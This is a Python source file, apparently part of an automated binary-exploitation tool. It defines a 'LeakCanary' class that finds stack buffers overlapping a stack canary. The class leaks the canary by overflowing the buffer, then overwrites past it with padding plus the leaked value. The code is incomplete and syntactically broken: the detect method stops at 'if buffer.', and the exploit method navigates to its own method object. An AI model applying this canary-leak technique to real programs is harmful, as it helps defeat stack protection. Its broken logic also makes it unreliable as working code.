from ..analyses import Vulnerability
from ..partials.unterminatedbuffer import UnterminatedBuffer
from ..functions import getLocal
from ....ashnazg import Connection

from dorat.schema import DoratFunction, DoratVariable

def hasCanary(function: DoratFunction):
    for call in function.calls:
        if call.funcName == "__stack_chk_fail":
            return True
    return False

def getCanaryBuffer(function) -> DoratFunction:
    return getLocal("local_10", function)

def overlappingBuffers(buffer1 : UnterminatedBuffer, canaryBuffer : DoratVariable):
    if buffer1.buffer.stackOffset + buffer1.bufferSize > canaryBuffer.stackOffset:
        return True
    return False

class LeakCanary(Vulnerability):
    name = "LeakCanary"
    
    def __init__(self, function, canary,
                 exploitBuffer : UnterminatedBuffer,
                 readBuffer : UnterminatedBuffer,
                 patchBuffer : UnterminatedBuffer):
        self.function = function
        self.canary = canary
        self.exploitBuffer = exploitBuffer
        self.patchBuffer = patchBuffer
        self.canaryValue = None
    
    def detect(self, function):
        if hasCanary(function):
            canary = getCanaryBuffer(function)
            write_buffers = UnterminatedBuffer.detect_all(function)

            canary_write_buffers = []
            for buffer in write_buffers:
                if overlappingBuffers(buffer.buffer, canary):
                    canary_write_buffers.append(buffer)
            if len(canary_write_buffers) > 2:
                # find a write + read buffer:
                write_buffer = None
                for buffer in canary_write_buffers:
                    if buffer.

                # any write will do if it happens after;
                # for now, we will cheat and simply use the address
                # as a proxy 

    def exploit(self, conn : Connection):
        conn.navigate(self.function)
        conn.navigate(self.exploitBuffer.write_call)
        conn.send(b"A"*self.exploitBuffer.bufferSize) # not quite right
        conn.navigate(self.exploit)
        self.canaryValue = conn.resolve(self.canary)
        # patch
        conn.navigate(self.exploitBuffer.inputLocation2) # might need to be inputLocation2?
        conn.send(b"A"*self.exploitBuffer.bufferSize + self.canaryValue)